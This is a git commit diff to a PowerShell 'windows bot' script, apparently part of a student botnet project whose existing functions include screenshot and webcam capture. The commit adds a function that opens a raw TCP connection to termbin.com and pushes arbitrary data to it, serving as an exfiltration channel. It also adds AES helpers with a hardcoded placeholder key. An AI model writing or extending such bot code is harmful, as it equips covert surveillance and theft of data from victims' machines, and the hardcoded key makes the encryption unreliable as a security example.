f1be006cf47375c01b8743009592d356f73bc840
sean <sjm4584@rit.edu>
2016-04-26 04:00:38 -0400

    added termbin connector code and AES code to file. have not tested.

--- bot_code/windows/win_bot.ps1
+++ bot_code/windows/win_bot.ps1
@@ -1,4 +1,58 @@
 # windows bot 
+# find_string test data: $stringarray = "this is a super hard test", "another etest yo"
+
+
+# Name: 		Send_NetworkData
+# Parameters: 	$data, whatever we're sending to termbin.com
+# Return value:	None
+# Purpose: 		Writes to termbin for us so we don't need to install netcat everywhere
+# CREDIT: 		This code was modified from: https://gist.github.com/jstangroome/9adaa87a845e5be906c8/
+function Send_NetworkData ($data) {
+    begin {
+        # establish the connection and a stream writer
+		$Encoding = [System.Text.Encoding]::ASCII
+        $Client = New-Object -TypeName System.Net.Sockets.TcpClient
+        $Client.Connect('termbin.com', '9999')
+        $Stream = $Client.GetStream()
+        $Writer = New-Object -Type System.IO.StreamWriter -ArgumentList $Stream, $Encoding, $Client.SendBufferSize, $true
+    }
+
+    process {
+        # send all the input data
+        foreach ($Line in $Data) {
+            $Writer.WriteLine($Line)
+        }
+    }
+
+    end {
+        # flush and close the connection send
+        $Writer.Flush()
+        $Writer.Dispose()
+        $Client.Client.Shutdown('Send')
+
+        # read the response
+        $Stream.ReadTimeout = [System.Threading.Timeout]::Infinite
+
+        $Result = ''
+        $Buffer = New-Object -TypeName System.Byte[] -ArgumentList $Client.ReceiveBufferSize
+        do {
+            try {
+                $ByteCount = $Stream.Read($Buffer, 0, $Buffer.Length)
+            } catch [System.IO.IOException] {
+                $ByteCount = 0
+            }
+            if ($ByteCount -gt 0) {
+                $Result += $Encoding.GetString($Buffer, 0, $ByteCount)
+            }
+        } while ($Stream.DataAvailable -or $Client.Client.Connected) 
+
+        Write-Output $Result
+        
+        # cleanup
+        $Stream.Dispose()
+        $Client.Dispose()
+    }
+}
 
 
 # Name:			create_hash
@@ -16,6 +70,7 @@ function create_hash($str_to_hash){
     return $hashed;
 }
 
+
 # Name:			get_uid
 # Parameters:	None
 # Return value:	$bot_uid (the uid of our bot)
@@ -31,6 +86,7 @@ function get_uid() {
 	
 	return $bot_uid
 }
+
 
 # Name: 		find_string
 # Parameters: 	$string, list of strings we are searching for
@@ -57,8 +113,7 @@ function find_string ($stringarray){
 	
 	echo $json |convertto-json
 }
-$stringarray = "this is a super hard test", "another etest yo"
-find_string $stringarray
+
 
 # Name:			take_screenshot
 # Parameters:	None
@@ -102,3 +157,95 @@ function webcam_capture {
 }
 
 
+
+# Name:			Create-AesManagedObject
+# Parameters:	Key and IV for encryption
+# Return value:	the aes oboject $aesManaged
+# Purpose:		Creates a powershell object to store our encrypted stuff 
+# CREDIT:		https://gist.github.com/ctigeek/2a56648b923d198a6e60
+function Create-AesManagedObject($key, $IV) {
+    $aesManaged = New-Object "System.Security.Cryptography.AesManaged"
+    $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
+    $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
+    $aesManaged.BlockSize = 128
+    $aesManaged.KeySize = 256
+    if ($IV) {
+        if ($IV.getType().Name -eq "String") {
+            $aesManaged.IV = [System.Convert]::FromBase64String($IV)
+        }
+        else {
+            $aesManaged.IV = $IV
+        }
+    }
+    if ($key) {
+        if ($key.getType().Name -eq "String") {
+            $aesManaged.Key = [System.Convert]::FromBase64String($key)
+        }
+        else {
+            $aesManaged.Key = $key
+        }
+    }
+    $aesManaged
+}
+
+# Name:			Create-AesKey
+# Parameters:	None
+# Return value:	encryption key in proper object form
+# Purpose:		Creates the key for encryption
+# CREDIT:		https://gist.github.com/ctigeek/2a56648b923d198a6e60
+function Create-AesKey() {
+    $aesManaged = Create-AesManagedObject
+	
+	$enc = [system.Text.Encoding]::UTF8
+	$encryption_key = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAC" #example key 32 chars long
+	$byte_key = $enc.GetBytes($encryption_key)
+	$aesManaged.Key = $byte_key
+
+    [System.Convert]::ToBase64String($aesManaged.Key)
+}
+
+# Name:			Encrypt-String
+# Parameters:	the key to encrypt with and the string to encrypt
+# Return value:	the encrypted string
+# Purpose:		Encrypts a string with a given key
+# CREDIT:		https://gist.github.com/ctigeek/2a56648b923d198a6e60
+function Encrypt-String($key, $unencryptedString) {
+    $bytes = [System.Text.Encoding]::UTF8.GetBytes($unencryptedString)
+    $aesManaged = Create-AesManagedObject $key
+    $encryptor = $aesManaged.CreateEncryptor()
+    $encryptedData = $encryptor.TransformFinalBlock($bytes, 0, $bytes.Length);
+    [byte[]] $fullData = $aesManaged.IV + $encryptedData
+    $aesManaged.Dispose()
+    [System.Convert]::ToBase64String($fullData)
+}
+
+# Name:			Decrypt-String
+# Parameters:	the key to decrypt with and the string to decrypt
+# Return value:	the decrypted string
+# Purpose:		Decrypts a string with a given key
+# CREDIT:		https://gist.github.com/ctigeek/2a56648b923d198a6e60
+function Decrypt-String($key, $encryptedStringWithIV) {
+    $bytes = [System.Convert]::FromBase64String($encryptedStringWithIV)
+    $IV = $bytes[0..15]
+    $aesManaged = Create-AesManagedObject $key $IV
+    $decryptor = $aesManaged.CreateDecryptor();
+    $unencryptedData = $decryptor.TransformFinalBlock($bytes, 16, $bytes.Length - 16);
+    $aesManaged.Dispose()
+    [System.Text.Encoding]::UTF8.GetString($unencryptedData).Trim([char]0)
+}
+
+# Name:			perform_encryption
+# Parameters:	actually encrypts or decrypts the string. POC of aes code for testing.
+# Return value:	the decrypted/encrypted string
+# Purpose:		poc for crypto
+function perform_encryption($data, $key){
+	$key = Create-AesKey
+
+	write-host $key
+	$unencryptedString = "blahblahblah"
+	$encryptedString = Encrypt-String $key $unencryptedString
+	$backToPlainText = Decrypt-String $key $encryptedString
+
+	write-host "[+] encrypted string: $encryptedString"
+	write-host "[+] backtoplain: $backToPlainText"
+}
